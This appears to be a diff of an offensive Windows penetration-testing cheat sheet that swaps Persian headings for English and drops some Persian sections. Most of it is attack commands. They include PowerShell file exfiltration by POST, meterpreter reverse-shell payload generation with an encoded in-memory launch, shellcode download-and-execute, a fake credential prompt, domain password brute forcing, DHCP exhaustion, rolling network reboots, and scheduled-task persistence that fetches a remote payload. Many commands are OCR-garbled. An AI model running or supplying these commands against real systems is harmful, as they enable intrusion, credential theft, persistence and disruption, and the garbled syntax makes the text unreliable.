 $ports=(#,#,#) ;$ip="x.x.x.x";foreach ($port in $ports) {try
@@ -823,21 +726,21 @@ if ($socket -eq $NULL) (echo $ip":"$port"- Closed";}
 else(echo $ip":"$port"- Open";$socket =$NULL;}}
 ```
 
-### دستور Ping با 500 millisecond timeout
+### Ping with 500 millisecond timeout
 
 ```text
 $ping = New-Object Sjstex.Net.Networkinformation.ping 
 $ping.Send('' ip '',5JO) 
 ```
 
-### پنجره Basic authentication
+### Basic authentication popup
 
 ```text
 powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass 
 $Host.UI.PromptForCredential(" title "," message "," user" "," domain") 
 ```
 
-### اجرای فایل exe \(از cmd.exe\)هر 4 ساعت بین تاریخ 8-11 آگوست 2013 وسایت 0800-1700
+### Run exe every 4 hours between aug 8-11, 2013 and the hours of 0800-1700 \(from cmd.exe\)
 
 ```text
 powershell. exe -Command "do {if ((Get-Date -format yyyyMMdd-HHmm) -match
@@ -845,7 +748,7 @@ powershell. exe -Command "do {if ((Get-Date -format yyyyMMdd-HHmm) -match
 WindowStyle Hidden "C:\Temp\my.exe";Start-Sleep -s 14400))while(1)" 
 ```
 
-### اجرای Powershell به عنوان
+### Powershell runas
 
 ```text
 $pw ~ convertto-securestring -string "PASSWORD" -asplaintext -force;
@@ -855,7 +758,7 @@ Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command
 &{Start-Process file.exe -verb runas)' 
 ```
 
-### ارسال کننده Email
+### Email sender
 
 ```text
 powershell.exe Send-l-1ai1Hessage -to " email " -from " email " -subject 
@@ -863,7 +766,7 @@ powershell.exe Send-l-1ai1Hessage -to " email " -from " email " -subject
 Email Server IP 
 ```
 
-### فعال سازی دسترسی از راه دور به powershell \(نیاز به اطلاعات هویتی\)
+Turn on powershell remoting \(with valid credentials\)
 
 ```text
 net time \\ip
@@ -874,7 +777,7 @@ at \ \ip time+2 "Powershell -Command 'Restart-Service WinRM'"
 Enter-PSSession -ComputerName ip -Credential username 
 ```
 
-### لیست hostname و ip برای کلیه دامین ها
+List hostname and ip for all domain computers
 
 ```text
 Get-WmiObject -ComputerName DC -Namespace root\microsoftDNS -Class 
@@ -882,7 +785,7 @@ MicrosoftDNS _ ResourceRecord -Filter "domainname~' DOMAIN '" | select
 textrepresentation 
 ```
 
-### دانلود از Powershell از مسیر خاص
+Powershell download for a file from a specified location
 
 ```text
 powershell.exe -noprofile -noninteractive -command 
@@ -892,7 +795,7 @@ $destination="C:\rnaster.zip"; $http = new-object Systern.Net.WebClient;
 $response= $http.DownloadFile($source, $destination);" 
 ```
 
-### نمایش داده های Powershell 
+### Powershell data exfil
 
 ```text
 Script will send a file ($filepath) via http to server ($server) via POST request. 
@@ -905,7 +808,7 @@ $filepath="C:\master.zip" $http= new=object System.Net.WebClient;
 $response= $http.UploadFile($server,$filepath);" 
 ```
 
-## استفاده از powershell برای اجرای meterpreter از memory
+## Using powershell to launch meterpreter from memory
 
 ```text
 Need Metasploit v4.5+ (msfvenom supports Powershell) 
@@ -913,7 +816,7 @@ Use Powershell (x86) with 32 bit Meterpreter payloads
 encodeMeterpreter.psl script can be found on next page 
 ```
 
-### در سیستم حمله کننده
+### On attack boxes
 
 ```text
 1. ./msfvenom -p Wlndows/meterpreter/reverse https -f psh -a x86 LHOST=1.1.1.1 LPORT=443 audit.psl 
@@ -923,7 +826,7 @@ encodeMeterpreter.psl script can be found on next page
 5. Copy the encoded Meterpreter string
 ```
 
-### شروع listener در سیستم حمله کننده
+### Start listener on attack box
 
 ```text
 1. ./msfconsole 
@@ -934,7 +837,7 @@ encodeMeterpreter.psl script can be found on next page
 6. exploit -j 
 ```
 
-### در سیستم هدف \(اجرای powershell\(x86\)\)
+### On target \(muse use powershell\(x86\)\)
 
 ```text
 1. powershell. exe -noexi t -encodedCommand paste encoded Meterpreter 
@@ -971,7 +874,7 @@ Write-Host $encodedCommand
 Copyright 2012 TrustedSec, LLC. All rights reserved.   
 Please see reference \[7\] for disclaimer
 
-## استفاده از powersehll برای راه اندازی meterpreter \(روش دوم\)
+## Using powershell to launch meterpreter \(2nd method\)
 
 ### On bt attack box
 
@@ -980,7 +883,7 @@ Please see reference \[7\] for disclaimer
 LPORT~8080 R I msfencode -t psh -a x86
 ```
 
-### در سیستم حمله کننده
+### On windows attack box
 
 ```text
 1. c:\ powershell
@@ -991,7 +894,7 @@ LPORT~8080 R I msfencode -t psh -a x86
 6. Copy contents of $e
 ```
 
-### شروع listener در سیستم حمله کننده
+### Start listener on attack box
 
 ```text
 1. ./msfconsole
@@ -1002,7 +905,7 @@ LPORT~8080 R I msfencode -t psh -a x86
 6. exploit -j
 ```
 
-### در سیستم هدف \(1:دانلود شل کد, 2:اجرا\)
+### On target shell \(1:download shellcode, 2:execute\)
 
 ```text
 1.  c: \ powershell -noprofile -noninteracti ve -command " &
@@ -1015,141 +918,134 @@ LPORT~8080 R I msfencode -t psh -a x86
 PROFIT
 ```
 
-### شناسایی دامنه های آسیب پذیر با powerup
+## Windows registry
 
-```text
-https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
-. .\PowerUp.ps1
-```
-
-## رجیستری ویندوز 
-
-### اطلاعات سیستم عامل
+### Os information
 
 ```text
 HKLM\Software\Microsoft\Windows NT\CurrentVersion
 ```
 
-### نام محصول
+### Product name
 
 ```text
 HKLM\Software\Microsoft\Windows NT\CurrentVersion /v
 ProductNarne
 ```
 
-### تاریخ نصب  
+### Data of install 
 
 ```text
 HKLM\Software\Microsoft\Windows NT\CurrentVersion /v InstallDate
 ```
 
-### نام ثبت شده
+### Registered owner
 
 ```text
 HKLM\Software\Microsoft\Windows NT\CurrentVersion /v RegisteredOwner
 ```
 
-### اطلاعات بوت سیستم
+### System boot
 
 ```text
 HKLM\Software\~icrosoft\Windows NT\CurrentVersion /v SystemRoot
 ```
 
-### اطلاعات Time zone \(بر حسب دقیقه از utc\)
+### Time zone \(offset in minutes from utc\)
 
 ```text
 HKLM\System\CurrentControlSet\Control\TimeZoneinformation /v ActiveTirneBias
 ```
 
-### نقشه درایور های شبکه
+### Mapped network drivers
 
 ```text
 HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive
 MRU
 ```
 
-### دستگاه های mounte شده 
+### Mounted devices
 
 ```text
 HKLM\System\MountedDevices
 ```
 
-### دستگاه های usb
+### USB devices
 
 ```text
 HKLM\System\CurrentControlSet\Enurn\USBStor
 ```
 
-### فعال سازی IP forwarding
+### Turn on IP forwarding
 
 ```text
 HKEY_LOCAL_~ACHI~E\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters -
 IPEnableRouter = 1
 ```
 
-### کلید های کلمه عبور: LSA secret cat certain vpn, autologon, other passwords
+### Password keys: LSA secret cat certain vpn, autologon, other passwords
 
 ```text
 HKEY LOCAL MACHINE\Security\Policy\Secrets
 HKCU\Software \Microsoft \Windows NT\CurrentVersion \Winlogon \autoadminlogon
 ```
 
-### اطلاعات Audit policy
+### Audit policy
 
 ```text
 HKLM\Security\Policy\PolAdTev
 ```
 
-### سرویس های کرنل و کاربر 
+### Kernel/user services
 
 ```text
 HKLM\Software\Microsoft\Windows NT\CurrentControlSet\Services
 ```
 
-### نرم افزار های نصب شده در سیستم 
+### Installed software on machine 
 
 ```text
 HKLM\Software
 ```
 
-### نرم افزار های نصب شده برای کاربر
+### Installed software for user
 
 ```text
 HKCU\Software
 ```
 
-### آخرین مستندات
+### Recent document
 
 ```text
 HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
 ```
 
-### آخرین موقعیت های کاربر
+### Recent user location
 
 ```text
 HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisite
 dtmu & \Opensavetmu
 ```
 
-### URL ها تایپ شده
+### Typed URLs
 
 ```text
 HKCU\Software\Microsoft\Internet Explorer\TypedURLs
 ```
 
-### لیست های MRU 
+### MRU lists
 
 ```text
 HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
 ```
 
-### آخرین کلید رجیستری استفاده شده
+### Last registry key accessed 
 
 ```text
 HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\RegEdit /v LastKeY
 ```
 
-### مسیر های راه اندازی
+### Startup locations
 
 ```text
 HKLM\Software\Microsoft\Windows\CurrentVersion\Run & \Runonce
@@ -1158,51 +1054,45 @@ HKCU\Software\Microsoft\Windows\CurrentVersion\Run & \Runonce
 HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load & \Run
 ```
 
-### فعال سازی Remote Desktop
+## Enumerating windows domain with dsquery
 
-```text
-Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
-```
-
-## دریافت اطلاعات ویندوز با dsquery
-
-### لیست کاربران دامین
+### List users on domain with no limit on results
 
 ```text
 dsquery user -limit 0
 ```
 
-### لیست گروه های دامین domain=victim.com
+### List groups for domain=victim.com
 
 ```text
 dsquery group "cn=users, dc=victim, dc=com"
 ```
 
-### لیست مدیران دامین
+### List domain admin accounts
 
 ```text
 dsquery group -name "domain admins" | dsget group -members -expand
 ```
 
-### لیست گروه های کاربر
+### List all groups for a user
 
 ```text
 dsquery user -name bob | dsget user -memberof -expand
 ```
 
-### دریافت id کاربر وارد شده
+### GET a user's login id
 
 ```text
 dsquery user -name bob | dsget user -samid
 ```
 
-### لیست کاربرانی که در دو هفته اخیر فعال نبوده اند
+### List accounts inactive for 2 weeks
 
 ```text
 dsquery user -inactive 2
 ```
 
-### اضافه نمودن کاربر
+### Add domain user
 
 ```text
 dsadd user "CN=Bob,CN=Users,DC=victim,DC=com" -samid bob -pwd bobpassdisplaj
@@ -1210,13 +1100,13 @@ dsadd user "CN=Bob,CN=Users,DC=victim,DC=com" -samid bob -pwd bobpassdisplaj
 Admins,CN=Users,DC=victim,DC=com
 ```
 
-### حذف کاربر
+### Delete user
 
 ```text
 dsrm -subtree -noprornpt "CN=Bob,CN=Users,DC=victim,DC=com"
 ```
 
-### لیست سیستم عامل های دامین
+### List all operating systems on domain
 
 ```text
 dsquery A "DC=victim,DC=com" -scope subtree -attr "en" "operatingSystem"
@@ -1225,25 +1115,25 @@ dsquery A "DC=victim,DC=com" -scope subtree -attr "en" "operatingSystem"
 ))"
 ```
 
-### لیست نام سایت ها
+### List all site names
 
 ```text
 dsquery site -o rdn -limit 0
 ```
 
-### لیست کلیه subnet های درون سایت
+### List all subnets within a site
 
 ```text
 dsquery subnet -site sitename -o rdn
 ```
 
-### لیست سرویس های درون سایت
+### List all services within a site
 
 ```text
 dsquery server -site sitename -o rdn
 ```
 
-### دریافت سرور های دامین
+### Find servers in the domain
 
 ```text
 dsquery ' domainroot -filter
@@ -1251,32 +1141,31 @@ dsquery ' domainroot -filter
 ) ) " -limit 0
 ```
 
-### لیست dc های سایت
+### Domain controller per site
 
 ```text
 dsquery "CN=Sites,CN=Configuration,DC=forestRootDomain" -filter
 (objectCategory=Server)
 ```
 
-## اسکریپت نویسی
+## Windows scripting 
 
-متغیر های اسکریپت های bash باید به شکل روبرو جایگزاری شوند  %%
-برای مثال %%i
+If scripting in batch file, variables must be preceeded with %%, i.e. %%i
 
-### ایجاد ping sweep
+### Nested for ping sweep
 
 ```text
 for /L %i in (10,1,254) do@ (for /L %x in (10,1,254) do@ ping -n 1 -w 100
 10.10.%i.%x 2 nul 1 find "Reply" && echo 10.10.%i.%x live.txt)
 ```
 
-### ایجاد loop درون file
+### loop through file
 
 ```text
 for /F %i in ( file ) do command
 ```
 
-### عملیات brute forcer دامین
+### Domain brute forcer
 
 ```text
 for /F %n in (names.txt) do for /F %pin (pawds.txt) do net use \\DC01\IPC$
@@ -1284,7 +1173,7 @@ for /F %n in (names.txt) do for /F %pin (pawds.txt) do net use \\DC01\IPC$
 \\DCOl\IPC$ NUL
 ```
 
-### بسته شدن حساب\(lockout.bat\)
+### Account lockout\(lockout.bat\)
 
 ```text
 @echo Test run:
@@ -1292,7 +1181,7 @@ for /f %%U in (list.txt) do @for /1 %%C in (1,1,5) do @echo net use \\WIN-
 1234\c$ /USER:%%U wrongpass
 ```
 
-### عملیت DHCP exhaustion
+### DHCP exhaustion
 
 ```text
 for /L %i
@@ -1301,7 +1190,7 @@ in (2,1,254) do (netsh interface ip set address local static
 netrnask gw ID %1 ping 127.0.0.1 -n l -w 10000 nul %1)
 ```
 
-### فرآیند DNS reverse lookup
+### DNS reverse lookup
 
 ```text
 for /L %i in (100, 1, 105)
@@ -1310,14 +1199,14 @@ do @ nslookup 1.1.1.%i I findstr /i /c:''Name''
 1.1.1.%i dns.txt
 ```
 
-### جست و جو کلیه مسیر های برای یافتن فایلی هایی که در آن ها PASS است و نمایش جزییات آن فایل
+### Search for files beginning with the work "PASS" and the print if it's a directory, file data/time, relative path, actual path and size \(@variable are optional\)
 
 ```text
 forfi1es /P c:\temp /s /m pass -c "cmd /c echo @isdir @fdate @ftime
 @relpath @path @fsize"
 ```
 
-### شبیه سازی دامین مخرب \(کاربردی برای تست IDS\)
+### Simulate malicious domain callouts \(useful for av/ids testing\)
 
 ```text
 # Run packet capture on attack domain to receive callout
@@ -1326,7 +1215,7 @@ for /L %i in (0,1,100) do (for /F %n in (domains.txt) do nslookup %n
 attack domain NUL 2 &1 & ping -n 5 127.0.0.1 NUL 2 &1
 ```
 
-### عملیات IE web looper \(ایجاد کننده ترافیک\)
+### IE web looper \(traffic generator\)
 
 ```text
 for /L %C in (1,1,5000) do @for %U in (www.yahoo.com www.pastebin.com
@@ -1334,7 +1223,7 @@ www.paypal.com www.craigslist.org www.google.com) do start /b iexplore %U &
 ping -n 6 localhost & taskkill /F /IM iexplore.exe
 ```
 
-### دریافت دسترسی سرویس های اجرایی
+### Get permission on service executables 
 
 ```text
 for /f "tokens=2 delims='='" %a in ('wmic service list full | find /i
@@ -1344,14 +1233,14 @@ for /f eol = " delims = " %a in (c:\windows\temp\3afd4ga.tmp) do cmd.exe
 /c icacls ''%a''
 ```
 
-### راه اندازی مجدد در حال چرخش \(جایگذاری /R با /S برای خاموش نمودن\):
+### Rolling reboot \(replace /R with /S for a shutdown\):
 
 ```text
 for /L %i in (2,1,254) do shutdown /r /m \\1.1.1.%i /f /t 0 /c "Reboot
 message"
 ```
 
-### ایجاد shell با استفاده از vbs \(نیاز به اطلاعات هویتی\)
+### Shell escalation using VBS \(need elevated credentials\)
 
 ```text
 # Create .vbs script with the following
@@ -1364,7 +1253,7 @@ wscript.sleep (100)
 shell.Sendkeys " password " & "{ENTER}"
 ```
 
-## زمان بندی نمودن task
+## Task scheduler
 
 ```text
 Scheduled tasks binary paths CANNOT contain spaces because everything
@@ -1374,7 +1263,7 @@ quotation marks ("):
 ... /TR "\"C:\Program Files\file.exe\" -x arg1"
 ```
 
-### زمان بندی نمودن task \(ST=زمان شروع, SD=تاریخ شروع, ED=تاریخ پایان\) \*نیاز به دسترسی admin
+### Task scheduler \(ST=start time, SD=start date, ED=end date\) \*Must be admin
 
 ```text
 SCHTASKS /CREATE /TN Task Name /SC HOURLY /ST HH:MM /F /RL HIGHEST /SD
@@ -1382,7 +1271,7 @@ MM/DD/YYYY /ED MM/DD/YYYY /tr "C:\my.exe" /RU DOMAIN/user /RP
 password
 ```
 
-### زمان بندی نمودن همیشگی task \[10\]
+### Task scheduler persistence \[10\]
 
 ```text
 For 64 bit use:
@@ -1405,148 +1294,4 @@ SCHTASKS /CREATE /TN Task Name /TR
 hidden -NoLogo -Noninteractive -ep bjpass -nop -c 'IEX ((new-object
 net.webclient) .downloadstring("http:// ip : port I payload"))'" /SC
 onidle /i 30
-```
-
-## دستورات کار با smb
-
-### ورود با کاربر خاص
-
-```text
-smbclient -L 10.10.10.10 -U tlavel
-```
-
-### تغییر کلمه عبور
-
-```text
-smbpasswd -r 10.10.10.10 -U tlavel
-```
-
-### نمایش مسیر به اشتراک گذاشته شده
-
-```text
-smbclient -L 10.10.10.10
-```
-
-### نمایش مسیر مشخص
-
-```text
-smbclient //10.10.10.10/forensic
-```
-
-### ورود به شل
-
-```text
-smbclient //10.10.10.10/profiles$
-```
-
-### دریافت کاربران به همراه هش کلمه عبور
-
-```text
-python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py 10.10.10.10L -usersfile
-```
-
-### حدس کلمه عبور های مختلف smb
-
-#### با metasploit
-
-```text
-msf5 > use auxiliary/scanner/smb/smb_login
-set pass_file wordlist
-set USER_file users.txt
-set RHOSTS 10.10.10.10
-run
-```
-
-#### با medusa
-
-```text
-medusa -h 10.10.10.10 -U users.txt -P wordlist -M smbnt
-```
-
-
-## دستورات rpcclient
-
-### ورود به سیستم
-
-```text
-rpcclient 10.10.10.10 -U support
-```
-
-### نمایش اطلاعات کاربر
-
-```text
-queryuser support
-```
-
-### نمایش کاربران
-
-```text
-enumdomusers
-```
-
-### نمایش دسترسی ها
-
-```text
-enumprivs
-```
-
-### تغییر دسترسی کاربر
-
-```text
-setuserinfo2 audit2020 23 'redteam'
-```
-
-### نمایش چاپگر ها
-
-```text
-enumprinters
-```
-
-## استخراج NTLM از فایل ntds.dit
-
-```text
-python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system system -
-hashes lmhash:nthash LOCAL -output nt-hash
-```
-
-## جمع آوری اطلاعات با استفاده از SharpHound
-
-```text
-https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe
-.\SharpHound.exe
-```
-
-## جمع آوری اطلاعات درباره Sql Server
-
-```text
-https://github.com/NetSPI/PowerUpSQL/blob/master/PowerUpSQL.ps1
-. .\PowerUpSQL.ps1
-Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
-```
-
-## بدست آوردن AS-REP Roast hash
-
-```text
-https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
-.\Rubeus.exe asreproast
-```
-
-## لیست ip های دردسترس بدون استفاده از nmap
-
-```text
-for /L %i in (1,1,255) do @ping -n 1 -w 200 10.10.10.%i > nul && echo 10.10.10.%i is up.
-```
-
-یا
-
-```text
-https://github.com/sperner/PowerShell/blob/master/PortScan.ps1
-.\PortScan.ps1
-.\PortScan.ps1 10.10.10.10 1 10000
-```
-
-## شناسایی سرویس با Test-WSMan
-
-```text
-PS> Test-WSMan -ComputerName <COMPUTERNAME> -Port 6666
 ```
